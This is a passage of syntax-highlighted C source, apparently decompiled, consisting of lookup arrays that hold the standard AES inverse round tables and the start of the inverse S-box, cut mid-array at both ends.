class="number">0x2dd56fa9</span>, <span class="number">0x1225cfb3</span>, <span class="number">0x99acc83b</span>, <span class="number">0x7d1810a7</span>, <span class="number">0x639ce86e</span>, <span class="number">0xbb3bdb7b</span>, <span class="number">0x7826cd09</span>, <span class="number">0x18596ef4</span>, <span class="number">0xb79aec01</span>, <span class="number">0x9a4f83a8</span>, <span class="number">0x6e95e665</span>, <span class="number">0xe6ffaa7e</span>, <span class="number">0xcfbc2108</span>, <span class="number">0xe815efe6</span>, <span class="number">0x9be7bad9</span>, <span class="number">0x366f4ace</span>, <span class="number">0x99fead4</span>, <span class="number">0x7cb029d6</span>, <span class="number">0xb2a431af</span>, <span class="number">0x233f2a31</span>, <span class="number">0x94a5c630</span>, <span class="number">0x66a235c0</span>, <span class="number">0xbc4e7437</span>, <span class="number">0xca82fca6</span>, <span class="number">0xd090e0b0</span>, <span class="number">0xd8a73315</span>, <span class="number">0x9804f14a</span>, <span class="number">0xdaec41f7</span>, <span class="number">0x50cd7f0e</span>, <span class="number">0xf691172f</span>, <span class="number">0xd64d768d</span>, <span class="number">0xb0ef434d</span>, <span class="number">0x4daacc54</span>, <span class="number">0x496e4df</span>, <span class="number">0xb5d19ee3</span>, <span class="number">0x886a4c1b</span>, <span class="number">0x1f2cc1b8</span>, <span class="number">0x5165467f</span>, <span class="number">0xea5e9d04</span>, <span class="number">0x358c015d</span>, <span class="number">0x7487fa73</span>, <span class="number">0x410bfb2e</span>, <span class="number">0x1d67b35a</span>, <span class="number">0xd2db9252</span>, <span class="number">0x5610e933</span>, <span class="number">0x47d66d13</span>, <span class="number">0x61d79a8c</span>, <span class="number">0xca1377a</span>, <span class="number">0x14f8598e</span>, <span class="number">0x3c13eb89</span>, <span class="number">0x27a9ceee</span>, <span class="number">0xc961b735</span>, <span class="number">0xe51ce1ed</span>, <span class="number">0xb1477a3c</span>, <span class="number">0xdfd29c59</span>, <span class="number">0x73f2553f</span>, <span class="number">0xce141879</span>, <span class="number">0x37c773bf</span>, <span class="number">0xcdf753ea</span>, <span class="number">0xaafd5f5b</span>, <span class="number">0x6f3ddf14</span>, <span class="number">0xdb447886</span>, <span class="number">0xf3afca81</span>, <span class="number">0xc468b93e</span>, <span class="number">0x3424382c</span>, <span class="number">0x40a3c25f</span>, <span class="number">0xc31d1672</span>, <span class="number">0x25e2bc0c</span>, <span class="number">0x493c288b</span>, <span class="number">0x950dff41</span>, <span class="number">0x1a83971</span>, <span class="number">0xb30c08de</span>, <span class="number">0xe4b4d89c</span>, <span class="number">0xc1566490</span>, <span class="number">0x84cb7b61</span>, <span class="number">0xb632d570</span>, <span class="number">0x5c6c4874</span>, <span class="number">0x57b8d042</span>&#125;;</span><br><span class="line"></span><br><span class="line">DWORD dword_405820[<span class="number">256</span>] = &#123;<span class="number">0xf45150a7</span>, <span class="number">0x417e5365</span>, <span class="number">0x171ac3a4</span>, <span class="number">0x273a965e</span>, <span class="number">0xab3bcb6b</span>, <span class="number">0x9d1ff145</span>, <span class="number">0xfaacab58</span>, <span class="number">0xe34b9303</span>, <span class="number">0x302055fa</span>, <span class="number">0x76adf66d</span>, <span class="number">0xcc889176</span>, <span class="number">0x2f5254c</span>, <span class="number">0xe54ffcd7</span>, <span class="number">0x2ac5d7cb</span>, <span class="number">0x35268044</span>, <span class="number">0x62b58fa3</span>, <span class="number">0xb1de495a</span>, <span class="number">0xba25671b</span>, <span class="number">0xea45980e</span>, <span class="number">0xfe5de1c0</span>, <span class="number">0x2fc30275</span>, <span class="number">0x4c8112f0</span>, <span class="number">0x468da397</span>, <span class="number">0xd36bc6f9</span>, <span class="number">0x8f03e75f</span>, <span class="number">0x9215959c</span>, <span class="number">0x6dbfeb7a</span>, <span class="number">0x5295da59</span>, <span class="number">0xbed42d83</span>, <span class="number">0x7458d321</span>, <span class="number">0xe0492969</span>, <span class="number">0xc98e44c8</span>, <span class="number">0xc2756a89</span>, <span class="number">0x8ef47879</span>, <span class="number">0x58996b3e</span>, <span class="number">0xb927dd71</span>, <span class="number">0xe1beb64f</span>, <span class="number">0x88f017ad</span>, <span class="number">0x20c966ac</span>, <span class="number">0xce7db43a</span>, <span class="number">0xdf63184a</span>, <span class="number">0x1ae58231</span>, <span class="number">0x51976033</span>, <span class="number">0x5362457f</span>, <span class="number">0x64b1e077</span>, <span class="number">0x6bbb84ae</span>, <span class="number">0x81fe1ca0</span>, <span class="number">0x8f9942b</span>, <span class="number">0x48705868</span>, <span class="number">0x458f19fd</span>, <span class="number">0xde94876c</span>, <span class="number">0x7b52b7f8</span>, <span class="number">0x73ab23d3</span>, <span class="number">0x4b72e202</span>, <span class="number">0x1fe3578f</span>, <span class="number">0x55662aab</span>, <span class="number">0xebb20728</span>, <span class="number">0xb52f03c2</span>, <span class="number">0xc5869a7b</span>, <span class="number">0x37d3a508</span>, <span class="number">0x2830f287</span>, <span class="number">0xbf23b2a5</span>, <span class="number">0x302ba6a</span>, <span class="number">0x16ed5c82</span>, <span class="number">0xcf8a2b1c</span>, <span class="number">0x79a792b4</span>, <span class="number">0x7f3f0f2</span>, <span class="number">0x694ea1e2</span>, <span class="number">0xda65cdf4</span>, <span class="number">0x506d5be</span>, <span class="number">0x34d11f62</span>, <span class="number">0xa6c48afe</span>, <span class="number">0x2e349d53</span>, <span class="number">0xf3a2a055</span>, <span class="number">0x8a0532e1</span>, <span class="number">0xf6a475eb</span>, <span class="number">0x830b39ec</span>, <span class="number">0x6040aaef</span>, <span class="number">0x715e069f</span>, <span class="number">0x6ebd5110</span>, <span class="number">0x213ef98a</span>, <span class="number">0xdd963d06</span>, <span class="number">0x3eddae05</span>, <span class="number">0xe64d46bd</span>, <span class="number">0x5491b58d</span>, <span class="number">0xc471055d</span>, <span class="number">0x6046fd4</span>, <span class="number">0x5060ff15</span>, <span class="number">0x981924fb</span>, <span class="number">0xbdd697e9</span>, <span class="number">0x4089cc43</span>, <span class="number">0xd967779e</span>, <span class="number">0xe8b0bd42</span>, <span class="number">0x8907888b</span>, <span class="number">0x19e7385b</span>, <span class="number">0xc879dbee</span>, <span class="number">0x7ca1470a</span>, <span class="number">0x427ce90f</span>, <span class="number">0x84f8c91e</span>, <span class="number">0x0</span>, <span class="number">0x80098386</span>, <span class="number">0x2b3248ed</span>, <span class="number">0x111eac70</span>, <span class="number">0x5a6c4e72</span>, <span class="number">0xefdfbff</span>, <span class="number">0x850f5638</span>, <span class="number">0xae3d1ed5</span>, <span class="number">0x2d362739</span>, <span class="number">0xf0a64d9</span>, <span class="number">0x5c6821a6</span>, <span class="number">0x5b9bd154</span>, <span class="number">0x36243a2e</span>, <span class="number">0xa0cb167</span>, <span class="number">0x57930fe7</span>, <span class="number">0xeeb4d296</span>, <span class="number">0x9b1b9e91</span>, <span class="number">0xc0804fc5</span>, <span class="number">0xdc61a220</span>, <span class="number">0x775a694b</span>, <span class="number">0x121c161a</span>, <span class="number">0x93e20aba</span>, <span class="number">0xa0c0e52a</span>, <span class="number">0x223c43e0</span>, <span class="number">0x1b121d17</span>, <span class="number">0x90e0b0d</span>, <span class="number">0x8bf2adc7</span>, <span class="number">0xb62db9a8</span>, <span class="number">0x1e14c8a9</span>, <span class="number">0xf1578519</span>, <span class="number">0x75af4c07</span>, <span class="number">0x99eebbdd</span>, <span class="number">0x7fa3fd60</span>, <span class="number">0x1f79f26</span>, <span class="number">0x725cbcf5</span>, <span class="number">0x6644c53b</span>, <span class="number">0xfb5b347e</span>, <span class="number">0x438b7629</span>, <span class="number">0x23cbdcc6</span>, <span class="number">0xedb668fc</span>, <span class="number">0xe4b863f1</span>, <span class="number">0x31d7cadc</span>, <span class="number">0x63421085</span>, <span class="number">0x97134022</span>, <span class="number">0xc6842011</span>, <span class="number">0x4a857d24</span>, <span class="number">0xbbd2f83d</span>, <span class="number">0xf9ae1132</span>, <span class="number">0x29c76da1</span>, <span class="number">0x9e1d4b2f</span>, <span class="number">0xb2dcf330</span>, <span class="number">0x860dec52</span>, <span class="number">0xc177d0e3</span>, <span class="number">0xb32b6c16</span>, <span class="number">0x70a999b9</span>, <span class="number">0x9411fa48</span>, <span class="number">0xe9472264</span>, <span class="number">0xfca8c48c</span>, <span class="number">0xf0a01a3f</span>, <span class="number">0x7d56d82c</span>, <span class="number">0x3322ef90</span>, <span class="number">0x4987c74e</span>, <span class="number">0x38d9c1d1</span>, <span class="number">0xca8cfea2</span>, <span class="number">0xd498360b</span>, <span class="number">0xf5a6cf81</span>, <span class="number">0x7aa528de</span>, <span class="number">0xb7da268e</span>, <span class="number">0xad3fa4bf</span>, <span class="number">0x3a2ce49d</span>, <span class="number">0x78500d92</span>, <span class="number">0x5f6a9bcc</span>, <span class="number">0x7e546246</span>, <span class="number">0x8df6c213</span>, <span class="number">0xd890e8b8</span>, <span class="number">0x392e5ef7</span>, <span class="number">0xc382f5af</span>, <span class="number">0x5d9fbe80</span>, <span class="number">0xd0697c93</span>, <span class="number">0xd56fa92d</span>, <span class="number">0x25cfb312</span>, <span class="number">0xacc83b99</span>, <span class="number">0x1810a77d</span>, <span class="number">0x9ce86e63</span>, <span class="number">0x3bdb7bbb</span>, <span class="number">0x26cd0978</span>, <span class="number">0x596ef418</span>, <span class="number">0x9aec01b7</span>, <span class="number">0x4f83a89a</span>, <span class="number">0x95e6656e</span>, <span class="number">0xffaa7ee6</span>, <span class="number">0xbc2108cf</span>, <span class="number">0x15efe6e8</span>, <span class="number">0xe7bad99b</span>, <span class="number">0x6f4ace36</span>, <span class="number">0x9fead409</span>, <span class="number">0xb029d67c</span>, <span class="number">0xa431afb2</span>, <span class="number">0x3f2a3123</span>, <span class="number">0xa5c63094</span>, <span class="number">0xa235c066</span>, <span class="number">0x4e7437bc</span>, <span class="number">0x82fca6ca</span>, <span class="number">0x90e0b0d0</span>, <span class="number">0xa73315d8</span>, <span class="number">0x4f14a98</span>, <span class="number">0xec41f7da</span>, <span class="number">0xcd7f0e50</span>, <span class="number">0x91172ff6</span>, <span class="number">0x4d768dd6</span>, <span class="number">0xef434db0</span>, <span class="number">0xaacc544d</span>, <span class="number">0x96e4df04</span>, <span class="number">0xd19ee3b5</span>, <span class="number">0x6a4c1b88</span>, <span class="number">0x2cc1b81f</span>, <span class="number">0x65467f51</span>, <span class="number">0x5e9d04ea</span>, <span class="number">0x8c015d35</span>, <span class="number">0x87fa7374</span>, <span class="number">0xbfb2e41</span>, <span class="number">0x67b35a1d</span>, <span class="number">0xdb9252d2</span>, <span class="number">0x10e93356</span>, <span class="number">0xd66d1347</span>, <span class="number">0xd79a8c61</span>, <span class="number">0xa1377a0c</span>, <span class="number">0xf8598e14</span>, <span class="number">0x13eb893c</span>, <span class="number">0xa9ceee27</span>, <span class="number">0x61b735c9</span>, <span class="number">0x1ce1ede5</span>, <span class="number">0x477a3cb1</span>, <span class="number">0xd29c59df</span>, <span class="number">0xf2553f73</span>, <span class="number">0x141879ce</span>, <span class="number">0xc773bf37</span>, <span class="number">0xf753eacd</span>, <span class="number">0xfd5f5baa</span>, <span class="number">0x3ddf146f</span>, <span class="number">0x447886db</span>, <span class="number">0xafca81f3</span>, <span class="number">0x68b93ec4</span>, <span class="number">0x24382c34</span>, <span class="number">0xa3c25f40</span>, <span class="number">0x1d1672c3</span>, <span class="number">0xe2bc0c25</span>, <span class="number">0x3c288b49</span>, <span class="number">0xdff4195</span>, <span class="number">0xa8397101</span>, <span class="number">0xc08deb3</span>, <span class="number">0xb4d89ce4</span>, <span class="number">0x566490c1</span>, <span class="number">0xcb7b6184</span>, <span class="number">0x32d570b6</span>, <span class="number">0x6c48745c</span>, <span class="number">0xb8d04257</span>&#125;;</span><br><span class="line"></span><br><span class="line">DWORD dword_405C20[<span class="number">256</span>] = &#123;<span class="number">0x5150a7f4</span>, <span class="number">0x7e536541</span>, <span class="number">0x1ac3a417</span>, <span class="number">0x3a965e27</span>, <span class="number">0x3bcb6bab</span>, <span class="number">0x1ff1459d</span>, <span class="number">0xacab58fa</span>, <span class="number">0x4b9303e3</span>, <span class="number">0x2055fa30</span>, <span class="number">0xadf66d76</span>, <span class="number">0x889176cc</span>, <span class="number">0xf5254c02</span>, <span class="number">0x4ffcd7e5</span>, <span class="number">0xc5d7cb2a</span>, <span class="number">0x26804435</span>, <span class="number">0xb58fa362</span>, <span class="number">0xde495ab1</span>, <span class="number">0x25671bba</span>, <span class="number">0x45980eea</span>, <span class="number">0x5de1c0fe</span>, <span class="number">0xc302752f</span>, <span class="number">0x8112f04c</span>, <span class="number">0x8da39746</span>, <span class="number">0x6bc6f9d3</span>, <span class="number">0x3e75f8f</span>, <span class="number">0x15959c92</span>, <span class="number">0xbfeb7a6d</span>, <span class="number">0x95da5952</span>, <span class="number">0xd42d83be</span>, <span class="number">0x58d32174</span>, <span class="number">0x492969e0</span>, <span class="number">0x8e44c8c9</span>, <span class="number">0x756a89c2</span>, <span class="number">0xf478798e</span>, <span class="number">0x996b3e58</span>, <span class="number">0x27dd71b9</span>, <span class="number">0xbeb64fe1</span>, <span class="number">0xf017ad88</span>, <span class="number">0xc966ac20</span>, <span class="number">0x7db43ace</span>, <span class="number">0x63184adf</span>, <span class="number">0xe582311a</span>, <span class="number">0x97603351</span>, <span class="number">0x62457f53</span>, <span class="number">0xb1e07764</span>, <span class="number">0xbb84ae6b</span>, <span class="number">0xfe1ca081</span>, <span class="number">0xf9942b08</span>, <span class="number">0x70586848</span>, <span class="number">0x8f19fd45</span>, <span class="number">0x94876cde</span>, <span class="number">0x52b7f87b</span>, <span class="number">0xab23d373</span>, <span class="number">0x72e2024b</span>, <span class="number">0xe3578f1f</span>, <span class="number">0x662aab55</span>, <span class="number">0xb20728eb</span>, <span class="number">0x2f03c2b5</span>, <span class="number">0x869a7bc5</span>, <span class="number">0xd3a50837</span>, <span class="number">0x30f28728</span>, <span class="number">0x23b2a5bf</span>, <span class="number">0x2ba6a03</span>, <span class="number">0xed5c8216</span>, <span class="number">0x8a2b1ccf</span>, <span class="number">0xa792b479</span>, <span class="number">0xf3f0f207</span>, <span class="number">0x4ea1e269</span>, <span class="number">0x65cdf4da</span>, <span class="number">0x6d5be05</span>, <span class="number">0xd11f6234</span>, <span class="number">0xc48afea6</span>, <span class="number">0x349d532e</span>, <span class="number">0xa2a055f3</span>, <span class="number">0x532e18a</span>, <span class="number">0xa475ebf6</span>, <span class="number">0xb39ec83</span>, <span class="number">0x40aaef60</span>, <span class="number">0x5e069f71</span>, <span class="number">0xbd51106e</span>, <span class="number">0x3ef98a21</span>, <span class="number">0x963d06dd</span>, <span class="number">0xddae053e</span>, <span class="number">0x4d46bde6</span>, <span class="number">0x91b58d54</span>, <span class="number">0x71055dc4</span>, <span class="number">0x46fd406</span>, <span class="number">0x60ff1550</span>, <span class="number">0x1924fb98</span>, <span class="number">0xd697e9bd</span>, <span class="number">0x89cc4340</span>, <span class="number">0x67779ed9</span>, <span class="number">0xb0bd42e8</span>, <span class="number">0x7888b89</span>, <span class="number">0xe7385b19</span>, <span class="number">0x79dbeec8</span>, <span class="number">0xa1470a7c</span>, <span class="number">0x7ce90f42</span>, <span class="number">0xf8c91e84</span>, <span class="number">0x0</span>, <span class="number">0x9838680</span>, <span class="number">0x3248ed2b</span>, <span class="number">0x1eac7011</span>, <span class="number">0x6c4e725a</span>, <span class="number">0xfdfbff0e</span>, <span class="number">0xf563885</span>, <span class="number">0x3d1ed5ae</span>, <span class="number">0x3627392d</span>, <span class="number">0xa64d90f</span>, <span class="number">0x6821a65c</span>, <span class="number">0x9bd1545b</span>, <span class="number">0x243a2e36</span>, <span class="number">0xcb1670a</span>, <span class="number">0x930fe757</span>, <span class="number">0xb4d296ee</span>, <span class="number">0x1b9e919b</span>, <span class="number">0x804fc5c0</span>, <span class="number">0x61a220dc</span>, <span class="number">0x5a694b77</span>, <span class="number">0x1c161a12</span>, <span class="number">0xe20aba93</span>, <span class="number">0xc0e52aa0</span>, <span class="number">0x3c43e022</span>, <span class="number">0x121d171b</span>, <span class="number">0xe0b0d09</span>, <span class="number">0xf2adc78b</span>, <span class="number">0x2db9a8b6</span>, <span class="number">0x14c8a91e</span>, <span class="number">0x578519f1</span>, <span class="number">0xaf4c0775</span>, <span class="number">0xeebbdd99</span>, <span class="number">0xa3fd607f</span>, <span class="number">0xf79f2601</span>, <span class="number">0x5cbcf572</span>, <span class="number">0x44c53b66</span>, <span class="number">0x5b347efb</span>, <span class="number">0x8b762943</span>, <span class="number">0xcbdcc623</span>, <span class="number">0xb668fced</span>, <span class="number">0xb863f1e4</span>, <span class="number">0xd7cadc31</span>, <span class="number">0x42108563</span>, <span class="number">0x13402297</span>, <span class="number">0x842011c6</span>, <span class="number">0x857d244a</span>, <span class="number">0xd2f83dbb</span>, <span class="number">0xae1132f9</span>, <span class="number">0xc76da129</span>, <span class="number">0x1d4b2f9e</span>, <span class="number">0xdcf330b2</span>, <span class="number">0xdec5286</span>, <span class="number">0x77d0e3c1</span>, <span class="number">0x2b6c16b3</span>, <span class="number">0xa999b970</span>, <span class="number">0x11fa4894</span>, <span class="number">0x472264e9</span>, <span class="number">0xa8c48cfc</span>, <span class="number">0xa01a3ff0</span>, <span class="number">0x56d82c7d</span>, <span class="number">0x22ef9033</span>, <span class="number">0x87c74e49</span>, <span class="number">0xd9c1d138</span>, <span class="number">0x8cfea2ca</span>, <span class="number">0x98360bd4</span>, <span class="number">0xa6cf81f5</span>, <span class="number">0xa528de7a</span>, <span class="number">0xda268eb7</span>, <span class="number">0x3fa4bfad</span>, <span class="number">0x2ce49d3a</span>, <span class="number">0x500d9278</span>, <span class="number">0x6a9bcc5f</span>, <span class="number">0x5462467e</span>, <span class="number">0xf6c2138d</span>, <span class="number">0x90e8b8d8</span>, <span class="number">0x2e5ef739</span>, <span class="number">0x82f5afc3</span>, <span class="number">0x9fbe805d</span>, <span class="number">0x697c93d0</span>, <span class="number">0x6fa92dd5</span>, <span class="number">0xcfb31225</span>, <span class="number">0xc83b99ac</span>, <span class="number">0x10a77d18</span>, <span class="number">0xe86e639c</span>, <span class="number">0xdb7bbb3b</span>, <span class="number">0xcd097826</span>, <span class="number">0x6ef41859</span>, <span class="number">0xec01b79a</span>, <span class="number">0x83a89a4f</span>, <span class="number">0xe6656e95</span>, <span class="number">0xaa7ee6ff</span>, <span class="number">0x2108cfbc</span>, <span class="number">0xefe6e815</span>, <span class="number">0xbad99be7</span>, <span class="number">0x4ace366f</span>, <span class="number">0xead4099f</span>, <span class="number">0x29d67cb0</span>, <span class="number">0x31afb2a4</span>, <span class="number">0x2a31233f</span>, <span class="number">0xc63094a5</span>, <span class="number">0x35c066a2</span>, <span class="number">0x7437bc4e</span>, <span class="number">0xfca6ca82</span>, <span class="number">0xe0b0d090</span>, <span class="number">0x3315d8a7</span>, <span class="number">0xf14a9804</span>, <span class="number">0x41f7daec</span>, <span class="number">0x7f0e50cd</span>, <span class="number">0x172ff691</span>, <span class="number">0x768dd64d</span>, <span class="number">0x434db0ef</span>, <span class="number">0xcc544daa</span>, <span class="number">0xe4df0496</span>, <span class="number">0x9ee3b5d1</span>, <span class="number">0x4c1b886a</span>, <span class="number">0xc1b81f2c</span>, <span class="number">0x467f5165</span>, <span class="number">0x9d04ea5e</span>, <span class="number">0x15d358c</span>, <span class="number">0xfa737487</span>, <span class="number">0xfb2e410b</span>, <span class="number">0xb35a1d67</span>, <span class="number">0x9252d2db</span>, <span class="number">0xe9335610</span>, <span class="number">0x6d1347d6</span>, <span class="number">0x9a8c61d7</span>, <span class="number">0x377a0ca1</span>, <span class="number">0x598e14f8</span>, <span class="number">0xeb893c13</span>, <span class="number">0xceee27a9</span>, <span class="number">0xb735c961</span>, <span class="number">0xe1ede51c</span>, <span class="number">0x7a3cb147</span>, <span class="number">0x9c59dfd2</span>, <span class="number">0x553f73f2</span>, <span class="number">0x1879ce14</span>, <span class="number">0x73bf37c7</span>, <span class="number">0x53eacdf7</span>, <span class="number">0x5f5baafd</span>, <span class="number">0xdf146f3d</span>, <span class="number">0x7886db44</span>, <span class="number">0xca81f3af</span>, <span class="number">0xb93ec468</span>, <span class="number">0x382c3424</span>, <span class="number">0xc25f40a3</span>, <span class="number">0x1672c31d</span>, <span class="number">0xbc0c25e2</span>, <span class="number">0x288b493c</span>, <span class="number">0xff41950d</span>, <span class="number">0x397101a8</span>, <span class="number">0x8deb30c</span>, <span class="number">0xd89ce4b4</span>, <span class="number">0x6490c156</span>, <span class="number">0x7b6184cb</span>, <span class="number">0xd570b632</span>, <span class="number">0x48745c6c</span>, <span class="number">0xd04257b8</span>&#125;;</span><br><span class="line"></span><br><span class="line">DWORD dword_405020[<span class="number">256</span>] = &#123;<span class="number">0x50a7f451</span>, <span class="number">0x5365417e</span>, <span class="number">0xc3a4171a</span>, <span class="number">0x965e273a</span>, <span class="number">0xcb6bab3b</span>, <span class="number">0xf1459d1f</span>, <span class="number">0xab58faac</span>, <span class="number">0x9303e34b</span>, <span class="number">0x55fa3020</span>, <span class="number">0xf66d76ad</span>, <span class="number">0x9176cc88</span>, <span class="number">0x254c02f5</span>, <span class="number">0xfcd7e54f</span>, <span class="number">0xd7cb2ac5</span>, <span class="number">0x80443526</span>, <span class="number">0x8fa362b5</span>, <span class="number">0x495ab1de</span>, <span class="number">0x671bba25</span>, <span class="number">0x980eea45</span>, <span class="number">0xe1c0fe5d</span>, <span class="number">0x2752fc3</span>, <span class="number">0x12f04c81</span>, <span class="number">0xa397468d</span>, <span class="number">0xc6f9d36b</span>, <span class="number">0xe75f8f03</span>, <span class="number">0x959c9215</span>, <span class="number">0xeb7a6dbf</span>, <span class="number">0xda595295</span>, <span class="number">0x2d83bed4</span>, <span class="number">0xd3217458</span>, <span class="number">0x2969e049</span>, <span class="number">0x44c8c98e</span>, <span class="number">0x6a89c275</span>, <span class="number">0x78798ef4</span>, <span class="number">0x6b3e5899</span>, <span class="number">0xdd71b927</span>, <span class="number">0xb64fe1be</span>, <span class="number">0x17ad88f0</span>, <span class="number">0x66ac20c9</span>, <span class="number">0xb43ace7d</span>, <span class="number">0x184adf63</span>, <span class="number">0x82311ae5</span>, <span class="number">0x60335197</span>, <span class="number">0x457f5362</span>, <span class="number">0xe07764b1</span>, <span class="number">0x84ae6bbb</span>, <span class="number">0x1ca081fe</span>, <span class="number">0x942b08f9</span>, <span class="number">0x58684870</span>, <span class="number">0x19fd458f</span>, <span class="number">0x876cde94</span>, <span class="number">0xb7f87b52</span>, <span class="number">0x23d373ab</span>, <span class="number">0xe2024b72</span>, <span class="number">0x578f1fe3</span>, <span class="number">0x2aab5566</span>, <span class="number">0x728ebb2</span>, <span class="number">0x3c2b52f</span>, <span class="number">0x9a7bc586</span>, <span class="number">0xa50837d3</span>, <span class="number">0xf2872830</span>, <span class="number">0xb2a5bf23</span>, <span class="number">0xba6a0302</span>, <span class="number">0x5c8216ed</span>, <span class="number">0x2b1ccf8a</span>, <span class="number">0x92b479a7</span>, <span class="number">0xf0f207f3</span>, <span class="number">0xa1e2694e</span>, <span class="number">0xcdf4da65</span>, <span class="number">0xd5be0506</span>, <span class="number">0x1f6234d1</span>, <span class="number">0x8afea6c4</span>, <span class="number">0x9d532e34</span>, <span class="number">0xa055f3a2</span>, <span class="number">0x32e18a05</span>, <span class="number">0x75ebf6a4</span>, <span class="number">0x39ec830b</span>, <span class="number">0xaaef6040</span>, <span class="number">0x69f715e</span>, <span class="number">0x51106ebd</span>, <span class="number">0xf98a213e</span>, <span class="number">0x3d06dd96</span>, <span class="number">0xae053edd</span>, <span class="number">0x46bde64d</span>, <span class="number">0xb58d5491</span>, <span class="number">0x55dc471</span>, <span class="number">0x6fd40604</span>, <span class="number">0xff155060</span>, <span class="number">0x24fb9819</span>, <span class="number">0x97e9bdd6</span>, <span class="number">0xcc434089</span>, <span class="number">0x779ed967</span>, <span class="number">0xbd42e8b0</span>, <span class="number">0x888b8907</span>, <span class="number">0x385b19e7</span>, <span class="number">0xdbeec879</span>, <span class="number">0x470a7ca1</span>, <span class="number">0xe90f427c</span>, <span class="number">0xc91e84f8</span>, <span class="number">0x0</span>, <span class="number">0x83868009</span>, <span class="number">0x48ed2b32</span>, <span class="number">0xac70111e</span>, <span class="number">0x4e725a6c</span>, <span class="number">0xfbff0efd</span>, <span class="number">0x5638850f</span>, <span class="number">0x1ed5ae3d</span>, <span class="number">0x27392d36</span>, <span class="number">0x64d90f0a</span>, <span class="number">0x21a65c68</span>, <span class="number">0xd1545b9b</span>, <span class="number">0x3a2e3624</span>, <span class="number">0xb1670a0c</span>, <span class="number">0xfe75793</span>, <span class="number">0xd296eeb4</span>, <span class="number">0x9e919b1b</span>, <span class="number">0x4fc5c080</span>, <span class="number">0xa220dc61</span>, <span class="number">0x694b775a</span>, <span class="number">0x161a121c</span>, <span class="number">0xaba93e2</span>, <span class="number">0xe52aa0c0</span>, <span class="number">0x43e0223c</span>, <span class="number">0x1d171b12</span>, <span class="number">0xb0d090e</span>, <span class="number">0xadc78bf2</span>, <span class="number">0xb9a8b62d</span>, <span class="number">0xc8a91e14</span>, <span class="number">0x8519f157</span>, <span class="number">0x4c0775af</span>, <span class="number">0xbbdd99ee</span>, <span class="number">0xfd607fa3</span>, <span class="number">0x9f2601f7</span>, <span class="number">0xbcf5725c</span>, <span class="number">0xc53b6644</span>, <span class="number">0x347efb5b</span>, <span class="number">0x7629438b</span>, <span class="number">0xdcc623cb</span>, <span class="number">0x68fcedb6</span>, <span class="number">0x63f1e4b8</span>, <span class="number">0xcadc31d7</span>, <span class="number">0x10856342</span>, <span class="number">0x40229713</span>, <span class="number">0x2011c684</span>, <span class="number">0x7d244a85</span>, <span class="number">0xf83dbbd2</span>, <span class="number">0x1132f9ae</span>, <span class="number">0x6da129c7</span>, <span class="number">0x4b2f9e1d</span>, <span class="number">0xf330b2dc</span>, <span class="number">0xec52860d</span>, <span class="number">0xd0e3c177</span>, <span class="number">0x6c16b32b</span>, <span class="number">0x99b970a9</span>, <span class="number">0xfa489411</span>, <span class="number">0x2264e947</span>, <span class="number">0xc48cfca8</span>, <span class="number">0x1a3ff0a0</span>, <span class="number">0xd82c7d56</span>, <span class="number">0xef903322</span>, <span class="number">0xc74e4987</span>, <span class="number">0xc1d138d9</span>, <span class="number">0xfea2ca8c</span>, <span class="number">0x360bd498</span>, <span class="number">0xcf81f5a6</span>, <span class="number">0x28de7aa5</span>, <span class="number">0x268eb7da</span>, <span class="number">0xa4bfad3f</span>, <span class="number">0xe49d3a2c</span>, <span class="number">0xd927850</span>, <span class="number">0x9bcc5f6a</span>, <span class="number">0x62467e54</span>, <span class="number">0xc2138df6</span>, <span class="number">0xe8b8d890</span>, <span class="number">0x5ef7392e</span>, <span class="number">0xf5afc382</span>, <span class="number">0xbe805d9f</span>, <span class="number">0x7c93d069</span>, <span class="number">0xa92dd56f</span>, <span class="number">0xb31225cf</span>, <span class="number">0x3b99acc8</span>, <span class="number">0xa77d1810</span>, <span class="number">0x6e639ce8</span>, <span class="number">0x7bbb3bdb</span>, <span class="number">0x97826cd</span>, <span class="number">0xf418596e</span>, <span class="number">0x1b79aec</span>, <span class="number">0xa89a4f83</span>, <span class="number">0x656e95e6</span>, <span class="number">0x7ee6ffaa</span>, <span class="number">0x8cfbc21</span>, <span class="number">0xe6e815ef</span>, <span class="number">0xd99be7ba</span>, <span class="number">0xce366f4a</span>, <span class="number">0xd4099fea</span>, <span class="number">0xd67cb029</span>, <span class="number">0xafb2a431</span>, <span class="number">0x31233f2a</span>, <span class="number">0x3094a5c6</span>, <span class="number">0xc066a235</span>, <span class="number">0x37bc4e74</span>, <span class="number">0xa6ca82fc</span>, <span class="number">0xb0d090e0</span>, <span class="number">0x15d8a733</span>, <span class="number">0x4a9804f1</span>, <span class="number">0xf7daec41</span>, <span class="number">0xe50cd7f</span>, <span class="number">0x2ff69117</span>, <span class="number">0x8dd64d76</span>, <span class="number">0x4db0ef43</span>, <span class="number">0x544daacc</span>, <span class="number">0xdf0496e4</span>, <span class="number">0xe3b5d19e</span>, <span class="number">0x1b886a4c</span>, <span class="number">0xb81f2cc1</span>, <span class="number">0x7f516546</span>, <span class="number">0x4ea5e9d</span>, <span class="number">0x5d358c01</span>, <span class="number">0x737487fa</span>, <span class="number">0x2e410bfb</span>, <span class="number">0x5a1d67b3</span>, <span class="number">0x52d2db92</span>, <span class="number">0x335610e9</span>, <span class="number">0x1347d66d</span>, <span class="number">0x8c61d79a</span>, <span class="number">0x7a0ca137</span>, <span class="number">0x8e14f859</span>, <span class="number">0x893c13eb</span>, <span class="number">0xee27a9ce</span>, <span class="number">0x35c961b7</span>, <span class="number">0xede51ce1</span>, <span class="number">0x3cb1477a</span>, <span class="number">0x59dfd29c</span>, <span class="number">0x3f73f255</span>, <span class="number">0x79ce1418</span>, <span class="number">0xbf37c773</span>, <span class="number">0xeacdf753</span>, <span class="number">0x5baafd5f</span>, <span class="number">0x146f3ddf</span>, <span class="number">0x86db4478</span>, <span class="number">0x81f3afca</span>, <span class="number">0x3ec468b9</span>, <span class="number">0x2c342438</span>, <span class="number">0x5f40a3c2</span>, <span class="number">0x72c31d16</span>, <span class="number">0xc25e2bc</span>, <span class="number">0x8b493c28</span>, <span class="number">0x41950dff</span>, <span class="number">0x7101a839</span>, <span class="number">0xdeb30c08</span>, <span class="number">0x9ce4b4d8</span>, <span class="number">0x90c15664</span>, <span class="number">0x6184cb7b</span>, <span class="number">0x70b632d5</span>, <span class="number">0x745c6c48</span>, <span class="number">0x4257b8d0</span>&#125;;</span><br><span class="line"></span><br><span class="line">BYTE RijnDael_AES_LONG_inv_406120[<span class="number">256</span>] = &#123;<span class="number">0x52</span>, <span class="number">0x09</span>, <span class="number">0x6A</span>, <span class="number">0xD5</span>, <span class="number">0x30</span>, <span class="number">0x36</span>, <span class="number">0xA5</span>, 